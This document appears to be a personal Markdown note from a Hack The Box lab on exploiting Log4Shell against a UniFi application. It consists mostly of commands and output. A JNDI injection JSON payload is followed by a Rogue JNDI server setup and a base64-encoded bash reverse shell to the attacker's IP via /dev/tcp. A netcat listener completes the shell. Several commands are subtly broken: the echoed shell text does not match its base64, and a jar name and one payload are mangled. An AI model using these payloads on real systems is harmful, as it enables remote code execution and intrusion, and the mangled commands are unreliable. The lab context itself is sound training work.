# Log4Shell

[About the vuln](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation)

[Using the vuln to attack a vulnerable Unify Networks application](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)

## Test for the vuln

Run a tcp dump on the ldap port on our host

```bash
sudo tcpdump -i tun0 port 389
```

and send the following payload

```json
{
    "username":"ababababab",
    "password":"dgdgdgdgd",
    "remember":"{jndi:ldap://10.10.14.153/bleurgh}",
    "strict":true
}
```

If successful, should see e.g.

```bash
cpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:32:26.527449 IP unified.htb.37928 > 10.10.14.153.ldap: Flags [S], seq 271015978, win 64240, options [mss 1337,sackOK,TS val 3400314648 ecr 0,nop,wscale 7], length 0
16:32:26.527464 IP 10.10.14.153.ldap > unified.htb.37928: Flags [R.], seq 0, ack 271015979, win 0, length 0
```

## Attacking with Rogue JNDI

[Rogue JNDI](https://github.com/veracode-research/rogue-jndi)

Build and run the Rogue JNDI webserver

```bash
# requires java 11+ (I've only tested w/ 17)
~$ git clone https://github.com/veracode-research/rogue-jndi
~$ cd rogue-jndi && mvn package

# where 10.10.14.153 is our own IP
~$ echo 'bash -c bash 10.14.153/8888 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUzLzg4ODggMD4mMQo=

~$ sudo java -jar targjar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUz|{base64,-d}|{bash,-i}" --hostname "10.10.14.153"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.153:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.153:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.153:1389/o=reference to artsploit.controllers.RemoteRefer
Mapping ldap://10.10.14.153:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.153:1389/o=websphere2,jar=* to artsploit.controllers.WebS
Mapping ldap://10.10.14.153:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.153:1389/o=websphere1,wsdl=* to artsploit.controllers.Web
Mapping ldap://10.10.14.153:1389/o=groovy to artsploit.controllers.Groovy

# start a TCP listener on the port we base64'd above
~$ nc -lvnp 8888
```

Then send e.g. the following payload to the vulnerable endpoint to pop a shell on our netcat tcp listener. Note the o=tomcat, corresponding to the option above.

```json
{
    "username":"ababababab",
    "password":"dgdgdgdgd",
    "remember":"${jndi:ldap://10.10.14.153:1389/o=tomcat}",
    "strict":true
}
```